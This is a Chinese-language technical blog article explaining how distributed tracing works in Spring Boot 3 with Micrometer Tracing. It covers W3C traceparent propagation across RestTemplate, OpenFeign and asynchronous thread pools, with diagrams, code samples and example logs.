<pre><code class="hljs language-markdown" lang="markdown">用户请求 → 用户服务 → 商品服务 → 库存服务
<span class="hljs-code">                  ↓
              订单服务 → 支付服务
</span></code></pre>
<p>当某个请求出现性能问题时，我们面临的困境是：</p>
<ol>
<li><strong>无法关联日志</strong>：每个服务都有自己的日志，但你不知道哪些日志属于同一个请求</li>
<li><strong>无法定位瓶颈</strong>：总耗时10秒，但不知道慢在哪个服务、哪个调用环节</li>
<li><strong>无法追踪异步</strong>：异步任务执行时，已经脱离了原始请求的上下文</li>
</ol>
<p>这就是为什么需要链路追踪。</p>
<h2 data-id="heading-2">二、链路追踪的本质：给请求一个全局身份</h2>
<h3 data-id="heading-3">2.1 核心概念</h3>
<p>链路追踪的核心是<strong>给每个请求分配一个全局唯一的ID（traceId），并在整个调用链中传递这个ID</strong>。</p>
<p>想象一下快递包裹：</p>
<ul>
<li><strong>traceId</strong> 就是快递单号，从发货到收货始终不变</li>
<li><strong>spanId</strong> 就是每个中转站的记录，每到一个站点都有新的编号</li>
</ul>
<pre><code class="hljs language-mermaid" lang="mermaid">graph LR
    A[浏览器] --&gt;|traceId: abc123&lt;br/&gt;spanId: span1| B[用户服务]
    B --&gt;|traceId: abc123&lt;br/&gt;spanId: span2| C[商品服务]
    C --&gt;|traceId: abc123&lt;br/&gt;spanId: span3| D[库存服务]
    
    style A fill:#e1f5ff
    style B fill:#fff4e1
    style C fill:#ffe1f5
    style D fill:#e1ffe1
</code></pre>
<p>这样，当你在日志系统中搜索 <code>traceId: abc123</code> 时，就能找到这个请求在所有服务中的所有日志。</p>
<h3 data-id="heading-4">2.2 W3C Trace Context 标准</h3>
<p>Spring Boot 3 采用 W3C Trace Context 标准，通过 HTTP 头 <code>traceparent</code> 传递链路信息：</p>
<pre><code class="hljs language-makefile" lang="makefile"><span class="hljs-section">traceparent: 00-4bf92f3577b34da6a3ce929d0e0e4736-00f067aa0ba902b7-01</span>
             ↑  ↑                                ↑                  ↑
             │  └─ traceId (32位16进制)          └─ spanId (16位)   └─ 标志位
             └─ 版本号
</code></pre>
<p>只需要关注两个字段：</p>
<ul>
<li><strong>traceId</strong>：这次请求的全局ID，所有服务共享</li>
<li><strong>spanId</strong>：当前服务/步骤的ID，每个服务都不同</li>
</ul>
<h2 data-id="heading-5">三、原理解析：Micrometer Tracing 架构</h2>
<h3 data-id="heading-6">3.1 从 Spring Cloud Sleuth 到 Micrometer</h3>
<p>Spring Boot 2.x 时代，链路追踪由 Spring Cloud Sleuth 负责。到了 Spring Boot 3.x，官方将链路追踪整合到 Micrometer 生态：</p>

























<table><thead><tr><th>组件</th><th>职责</th></tr></thead><tbody><tr><td><code>micrometer-observation</code></td><td>观测抽象层，统一指标、追踪、日志</td></tr><tr><td><code>micrometer-tracing</code></td><td>链路追踪的核心接口</td></tr><tr><td><code>micrometer-tracing-bridge-brave</code></td><td>与 Brave（Zipkin）的桥接实现</td></tr><tr><td><code>context-propagation</code></td><td>上下文传播（多线程场景）</td></tr></tbody></table>
<p>这样做的好处是：<strong>链路追踪不再是孤立的功能，而是整个可观测性体系的一部分</strong>。</p>
<h3 data-id="heading-7">3.2 整体工作流程</h3>
<pre><code class="hljs language-mermaid" lang="mermaid">flowchart TB
    subgraph Client[客户端/网关]
        A[HTTP 请求]
        A --&gt; B{是否有&lt;br/&gt;traceparent?}
        B --&gt;|有| C[复用 traceId]
        B --&gt;|无| D[生成新 traceId]
    end
    
    subgraph Service1[用户服务]
        E[HTTP Filter] --&gt; F[W3CPropagation&lt;br/&gt;提取器]
        F --&gt; G[TraceContext&lt;br/&gt;绑定到 ThreadLocal]
        G --&gt; H[业务逻辑执行]
        H --&gt; I{需要调用&lt;br/&gt;下游服务?}
        I --&gt;|是| J[W3CPropagation&lt;br/&gt;注入器]
    end
    
    subgraph Service2[商品服务]
        K[HTTP Filter] --&gt; L[提取 traceparent]
        L --&gt; M[继承 traceId&lt;br/&gt;创建新 spanId]
    end
    
    C --&gt; E
    D --&gt; E
    J --&gt; K
    
    style Client fill:#e1f5ff
    style Service1 fill:#fff4e1
    style Service2 fill:#ffe1f5
</code></pre>
<p>核心流程分为三个阶段：</p>
<ol>
<li><strong>入口阶段</strong>：HTTP Filter 拦截请求，提取或创建 TraceContext</li>
<li><strong>绑定阶段</strong>：将 TraceContext 绑定到当前线程的 ThreadLocal</li>
<li><strong>传播阶段</strong>：调用下游服务时，将 TraceContext 注入到 HTTP 请求头</li>
</ol>
<h3 data-id="heading-8">3.3 关键组件：W3CPropagation</h3>
<p><code>W3CPropagation</code> 是 Micrometer Tracing 中负责 <code>traceparent</code> 解析和注入的核心组件。它有两个关键方法：</p>
<p><strong>提取器（Extractor）</strong>：从 HTTP 请求中读取 <code>traceparent</code></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 伪代码展示思路</span>
TraceContext <span class="hljs-title function_">extract</span><span class="hljs-params">(HttpRequest request)</span> {
    <span class="hljs-type">String</span> <span class="hljs-variable">traceparent</span> <span class="hljs-operator">=</span> request.getHeader(<span class="hljs-string">"traceparent"</span>);
    <span class="hljs-keyword">if</span> (traceparent != <span class="hljs-literal">null</span>) {
        <span class="hljs-comment">// 解析：00-&lt;traceId&gt;-&lt;spanId&gt;-01</span>
        <span class="hljs-keyword">return</span> parseTraceContext(traceparent);
    }
    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>; <span class="hljs-comment">// 没有找到，需要创建新的</span>
}
</code></pre>
<p><strong>注入器（Injector）</strong>：将 TraceContext 写入 HTTP 请求头</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 伪代码展示思路</span>
<span class="hljs-keyword">void</span> <span class="hljs-title function_">inject</span><span class="hljs-params">(TraceContext context, HttpRequest request)</span> {
    <span class="hljs-type">String</span> <span class="hljs-variable">traceparent</span> <span class="hljs-operator">=</span> format(
        <span class="hljs-string">"00-%s-%s-01"</span>,
        context.traceId(),
        context.spanId()
    );
    request.setHeader(<span class="hljs-string">"traceparent"</span>, traceparent);
}
</code></pre>
<h2 data-id="heading-9">四、三种调用方式的传播机制</h2>
<p>在 Spring Boot 3 中，链路追踪对三种主要调用方式提供了自动支持：</p>
<h3 data-id="heading-10">4.1 RestTemplate：同步 HTTP 调用</h3>
<p><strong>传播机制</strong>：通过拦截器在发送请求前注入 <code>traceparent</code></p>
<pre><code class="hljs language-mermaid" lang="mermaid">sequenceDiagram
    participant A as 用户服务&lt;br/&gt;(traceId: abc)
    participant B as RestTemplate&lt;br/&gt;拦截器
    participant C as 商品服务

    A-&gt;&gt;B: restTemplate.get(...)
    Note over B: 从 ThreadLocal&lt;br/&gt;获取 TraceContext
    Note over B: 创建新 spanId
    B-&gt;&gt;C: HTTP Request&lt;br/&gt;traceparent: 00-abc-span2-01
    Note over C: 提取 traceparent
    C--&gt;&gt;B: HTTP Response
    B--&gt;&gt;A: 返回结果
    
    rect rgb(255, 244, 225)
    Note over A,C: traceId 保持不变：abc&lt;br/&gt;spanId 不同：span1 → span2
    end
</code></pre>
<p><strong>自动配置原理</strong>：Spring Boot 3 会自动为 <code>RestTemplate</code> bean 添加 <code>TracingClientHttpRequestInterceptor</code></p>
<p>你只需要正常使用 RestTemplate：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Autowired</span>
<span class="hljs-keyword">private</span> RestTemplate restTemplate;

<span class="hljs-keyword">public</span> Product <span class="hljs-title function_">getProduct</span><span class="hljs-params">(String productId)</span> {
    <span class="hljs-comment">// 框架会自动注入 traceparent</span>
    <span class="hljs-keyword">return</span> restTemplate.getForObject(
        <span class="hljs-string">"http://product-service/api/product/"</span> + productId,
        Product.class
    );
}
</code></pre>
<h3 data-id="heading-11">4.2 OpenFeign：声明式 HTTP 调用</h3>
<p><strong>传播机制</strong>：通过 Feign 拦截器在构造请求时注入 <code>traceparent</code></p>
<pre><code class="hljs language-mermaid" lang="mermaid">sequenceDiagram
    participant A as 用户服务&lt;br/&gt;(traceId: abc)
    participant B as Feign&lt;br/&gt;拦截器
    participant C as 商品服务

    A-&gt;&gt;B: productClient.getProduct(id)
    Note over B: 从 ThreadLocal&lt;br/&gt;获取 TraceContext
    Note over B: 创建新 spanId
    B-&gt;&gt;C: HTTP Request&lt;br/&gt;traceparent: 00-abc-span2-01
    Note over C: 提取 traceparent
    C--&gt;&gt;B: HTTP Response
    B--&gt;&gt;A: 返回结果
    
    rect rgb(255, 225, 245)
    Note over A,C: 与 RestTemplate 本质相同&lt;br/&gt;只是拦截点不同
    end
</code></pre>
<p><strong>关键依赖</strong>：需要同时引入 <code>spring-cloud-starter-openfeign</code> 和 <code>micrometer-tracing-bridge-brave</code></p>
<p>使用方式完全透明：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@FeignClient(name = "product-service")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">ProductFeignClient</span> {
    <span class="hljs-meta">@GetMapping("/api/product/{id}")</span>
    Product <span class="hljs-title function_">getProduct</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable</span> String id)</span>;
}
</code></pre>
<h3 data-id="heading-12">4.3 异步调用：最容易出问题的场景</h3>
<p><strong>核心问题</strong>：新线程无法访问主线程的 ThreadLocal</p>
<pre><code class="hljs language-mermaid" lang="mermaid">flowchart LR
    A[主线程&lt;br/&gt;traceId: abc&lt;br/&gt;spanId: span1] --&gt;|提交任务| B[线程池]
    B --&gt; C[工作线程&lt;br/&gt;traceId: ???&lt;br/&gt;spanId: ???]
    
    style A fill:#fff4e1
    style C fill:#ffcccc
</code></pre>
<p><strong>解决方案</strong>：Context Propagation 库</p>
<p>原理是在提交任务时"拍快照"，在执行任务时"恢复快照"：</p>
<pre><code class="hljs language-mermaid" lang="mermaid">flowchart LR
    subgraph Main[主线程]
        A[TraceContext&lt;br/&gt;in ThreadLocal]
        B[captureAll&lt;br/&gt;拍快照]
    end
    
    subgraph Pool[线程池]
        C[Runnable&lt;br/&gt;包装]
    end
    
    subgraph Worker[工作线程]
        D[setThreadLocals&lt;br/&gt;恢复快照]
        E[执行任务&lt;br/&gt;traceId 可用]
    end
    
    A --&gt; B
    B --&gt; C
    C --&gt; D
    D --&gt; E
    
    style Main fill:#e1f5ff
    style Pool fill:#fff4e1
    style Worker fill:#e1ffe1
</code></pre>
<p><strong>实现代码</strong>：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Bean(name = "taskExecutor")</span>
<span class="hljs-keyword">public</span> Executor <span class="hljs-title function_">taskExecutor</span><span class="hljs-params">()</span> {
    <span class="hljs-type">ThreadPoolTaskExecutor</span> <span class="hljs-variable">executor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadPoolTaskExecutor</span>();
    executor.setCorePoolSize(<span class="hljs-number">5</span>);
    executor.setMaxPoolSize(<span class="hljs-number">10</span>);
    
    <span class="hljs-comment">// 关键：使用 TaskDecorator 传递上下文</span>
    executor.setTaskDecorator(runnable -&gt; {
        <span class="hljs-comment">// 主线程中拍快照</span>
        <span class="hljs-type">ContextSnapshot</span> <span class="hljs-variable">snapshot</span> <span class="hljs-operator">=</span> ContextSnapshot.captureAll();
        
        <span class="hljs-keyword">return</span> () -&gt; {
            <span class="hljs-comment">// 工作线程中恢复快照</span>
            <span class="hljs-keyword">try</span> (ContextSnapshot.<span class="hljs-type">Scope</span> <span class="hljs-variable">scope</span> <span class="hljs-operator">=</span> snapshot.setThreadLocals()) {
                runnable.run();
            }
        };
    });
    
    executor.initialize();
    <span class="hljs-keyword">return</span> executor;
}
</code></pre>
<p>配合 <code>@Async</code> 使用：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Async("taskExecutor")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">processAsync</span><span class="hljs-params">(String userId)</span> {
    <span class="hljs-comment">// 这里可以正常获取 traceId</span>
    log.info(<span class="hljs-string">"异步处理用户: {}"</span>, userId);
}
</code></pre>
<h2 data-id="heading-13">五、实战验证：看日志就知道对不对</h2>
<h3 data-id="heading-14">5.1 日志格式配置</h3>
<p>在 <code>logback-spring.xml</code> 中配置：</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">pattern</span>&gt;</span>
    %d{yyyy-MM-dd HH:mm:ss.SSS} %5p [%X{traceId},%X{spanId}] --- [%15.15t] %-40.40logger{39} : %m%n
<span class="hljs-tag">&lt;/<span class="hljs-name">pattern</span>&gt;</span>
</code></pre>
<p>这样日志会自动包含 traceId 和 spanId：</p>
<pre><code class="hljs language-ini" lang="ini">2025-01-19 10:30:45.123  INFO <span class="hljs-section">[693e7d733e60746092fcdb114196f430,92fcdb114196f430]</span> --- <span class="hljs-section">[nio-8081-exec-1]</span> c.s.user.controller.UserController : 收到请求
</code></pre>
<h3 data-id="heading-15">5.2 验证 RestTemplate 调用</h3>
<p>启动用户服务和商品服务，调用：</p>
<pre><code class="hljs language-bash" lang="bash">curl http://localhost:8081/user/rest/U001
</code></pre>
<p>观察日志：</p>
<p><strong>用户服务</strong>：</p>
<pre><code class="hljs language-ini" lang="ini">INFO <span class="hljs-section">[abc123,span1]</span> --- <span class="hljs-section">[nio-8081-exec-1]</span> UserController : 【用户服务】收到请求 U001
INFO <span class="hljs-section">[abc123,span1]</span> --- <span class="hljs-section">[nio-8081-exec-1]</span> UserController : 【用户服务】调用商品服务
</code></pre>
<p><strong>商品服务</strong>：</p>
<pre><code class="hljs language-css" lang="css">INFO <span class="hljs-selector-attr">[abc123,span2]</span> --- <span class="hljs-selector-attr">[nio-8082-exec-1]</span> ProductController : 【商品服务】收到请求 P001
</code></pre>
<p><strong>验证点</strong>：</p>
<ul>
<li>traceId 相同：<code>abc123</code></li>
<li>spanId 不同：用户服务是 <code>span1</code>，商品服务是 <code>span2</code></li>
</ul>
<h3 data-id="heading-16">5.3 验证异步调用</h3>
<p>调用：</p>
<pre><code class="hljs language-bash" lang="bash">curl http://localhost:8081/user/async/U003
</code></pre>
<p>观察日志：</p>
<p><strong>主线程</strong>：</p>
<pre><code class="hljs language-css" lang="css">INFO <span class="hljs-selector-attr">[abc123,span1]</span> --- <span class="hljs-selector-attr">[nio-8081-exec-1]</span> UserController : 【用户服务-异步】收到请求 U003
</code></pre>
<p><strong>异步线程（async-1）</strong>：</p>
<pre><code class="hljs language-ini" lang="ini">INFO <span class="hljs-section">[abc123,span1]</span> --- <span class="hljs-section">[async-1]</span> AsyncService : 【异步任务】开始执行 U003
INFO <span class="hljs-section">[abc123,span1]</span> --- <span class="hljs-section">[async-1]</span> AsyncService : 【异步任务】执行完成
</code></pre>
<p><strong>异步线程调用商品服务（async-2）</strong>：</p>
<pre><code class="hljs language-css" lang="css">INFO <span class="hljs-selector-attr">[abc123,span1]</span> --- <span class="hljs-selector-attr">[async-2]</span> AsyncService : 【异步调用】开始调用商品服务
</code></pre>
<p><strong>商品服务</strong>：</p>
<pre><code class="hljs language-css" lang="css">INFO <span class="hljs-selector-attr">[abc123,span2]</span> --- <span class="hljs-selector-attr">[nio-8082-exec-1]</span> ProductController : 【商品服务】收到请求 P003
</code></pre>
<p><strong>验证点</strong>：</p>
<ul>
<li>主线程和所有异步线程的 traceId 都是 <code>abc123</code></li>
<li>证明 Context Propagation 成功传递了上下文</li>
</ul>
<h2 data-id="heading-17">六、从原理到抽象：统一视角下的链路追踪</h2>
<p>前面我们从技术细节的角度，详细分析了 Micrometer Tracing 的工作原理：</p>
<ul>
<li>W3C Trace Context 标准如何定义 traceparent</li>
<li>W3CPropagation 如何提取和注入上下文</li>
<li>三种调用方式各自的传播机制</li>
</ul>
<p>现在，让我们从更高的抽象层次，提炼出链路追踪的核心思想。</p>
<h3 data-id="heading-18">6.1 三个核心抽象</h3>
<p>通过对 Micrometer Tracing 的解析，可以提炼出三个核心抽象：</p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TB
    A[TraceContext&lt;br/&gt;链路上下文] --&gt; B[W3CPropagation&lt;br/&gt;传播协议]
    A --&gt; C[ContextSnapshot&lt;br/&gt;上下文快照]
    
    B --&gt; D[HTTP 请求间传播]
    C --&gt; E[线程间传播]
    
    style A fill:#e1f5ff
    style B fill:#fff4e1
    style C fill:#ffe1f5
    style D fill:#e1ffe1
    style E fill:#ffe1e1
</code></pre>
<ol>
<li><strong>TraceContext</strong>：链路上下文，存储 traceId 和 spanId</li>
<li><strong>W3CPropagation</strong>：在 HTTP 请求间传播上下文</li>
<li><strong>ContextSnapshot</strong>：在线程间传播上下文</li>
</ol>
<h3 data-id="heading-19">6.2 统一的传播模式</h3>
<p>无论是 RestTemplate、OpenFeign 还是异步调用，传播模式都是统一的：</p>
<pre><code class="hljs language-mermaid" lang="mermaid">flowchart LR
    A[入口拦截] --&gt; B[提取/创建&lt;br/&gt;TraceContext]
    B --&gt; C[绑定到&lt;br/&gt;ThreadLocal]
    C --&gt; D[业务逻辑]
    D --&gt; E{需要传播?}
    E --&gt;|HTTP 调用| F[注入 HTTP 头]
    E --&gt;|异步任务| G[捕获快照]
    
    style A fill:#e1f5ff
    style B fill:#fff4e1
    style C fill:#ffe1f5
    style D fill:#e1ffe1
    style F fill:#ffe1e1
    style G fill:#f5e1ff
</code></pre>
<p><strong>统一流程</strong>：</p>
<ol>
<li>入口拦截（HTTP Filter 或任务包装器）</li>
<li>提取或创建 TraceContext</li>
<li>绑定到当前执行上下文（ThreadLocal）</li>
<li>业务逻辑执行</li>
<li>需要传播时，通过不同机制传出去</li>
</ol>
<h3 data-id="heading-20">6.3 设计思想：分层与自动化</h3>
<p>Micrometer Tracing 的设计体现了两个重要思想：</p>
<p><strong>分层抽象</strong>：</p>
<pre><code class="hljs">┌─────────────────────────────┐
│   应用层（业务代码）          │  你的代码无感知
├─────────────────────────────┤
│   框架层（自动配置）          │  Spring Boot 自动配置
├─────────────────────────────┤
│   抽象层（Micrometer）        │  统一接口
├─────────────────────────────┤
│   实现层（Brave/OTel）        │  可插拔的实现
└─────────────────────────────┘
</code></pre>
<p><strong>自动化原则</strong>：</p>
<ul>
<li>不修改业务代码就能接入</li>
<li>不需要手动传递 traceId</li>
<li>不需要关心底层实现（Brave 或 OpenTelemetry）</li>
</ul>
<h2 data-id="heading-21">七、总结：从原理理解到抽象认知</h2>
<h3 data-id="heading-22">原理层面的认识</h3>
<p>回到最开始的问题：如何在微服务调用链中追踪一个请求？</p>
<p>从原理层面看，答案是：<strong>给请求分配一个全局ID（traceId），并通过不同的传播机制，在整个调用链中传递这个ID</strong>。</p>
<p>Micrometer Tracing 提供了三种传播机制：</p>

























<table><thead><tr><th>场景</th><th>传播载体</th><th>传播机制</th></tr></thead><tbody><tr><td>跨服务调用（HTTP）</td><td>HTTP 请求头</td><td>W3CPropagation 注入/提取</td></tr><tr><td>跨线程调用（异步）</td><td>上下文快照</td><td>ContextSnapshot 捕获/恢复</td></tr><tr><td>同线程调用</td><td>ThreadLocal</td><td>直接访问</td></tr></tbody></table>
<h3 data-id="heading-23">抽象层面的认识</h3>
<p>从抽象层面看，链路追踪的本质是<strong>上下文传播的自动化</strong>。</p>
<p>整个体系建立在两个基础之上：</p>
<ol>
<li><strong>标准协议</strong>：W3C Trace Context，确保不同系统间的互操作性</li>
<li><strong>统一抽象</strong>：Micrometer Observation，将指标、追踪、日志统一管理</li>
</ol>
<p>Micrometer 的设计哲学体现在：</p>
<ul>
<li><strong>分层解耦</strong>：应用层、框架层、抽象层、实现层各司其职</li>
<li><strong>自动化优先</strong>：不修改业务代码就能接入</li>
<li><strong>标准化驱动</strong>：遵循 W3C 等国际标准</li>
</ul>
<h3 data-id="heading-24">链路追踪的价值</h3>
<p>最后，链路追踪的价值不仅仅在于"找到慢在哪"，更在于：</p>
<ul>
<li><strong>可观测性</strong>：让系统行为可见</li>
<li><strong>可诊断性</strong>：快速定位问题根因</li>
<li><strong>可优化性</strong>：基于数据做性能优化</li>
</ul>
<p>当你在日志中看到这样的输出时：</p>
<pre><code class="hljs language-csharp" lang="csharp">[<span class="hljs-meta">abc123,span1</span>] 用户服务收到请求，耗时<span class="hljs-number">10</span>ms
[<span class="hljs-meta">abc123,span2</span>] 商品服务查询数据库，耗时<span class="hljs-number">5000</span>ms
[<span class="hljs-meta">abc123,span3</span>] 库存服务调用缓存，耗时<span class="hljs-number">5</span>ms
</code></pre>
<p>你立刻就知道：<strong>瓶颈在商品服务的数据库查询</strong>。</p>
<h3 data-id="heading-25">写在最后</h3>
<p>理解了原理，才能在出问题时快速定位；
理解了抽象，才能设计出更好的系统。</p>
<p>希望这两篇文章能帮你：</p>
<ul>
<li>第一篇：快速落地链路追踪</li>
<li>第二篇：深度理解背后原理</li>
</ul>
<p>这就是分布式链路追踪的力量。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item>  </channel></rss>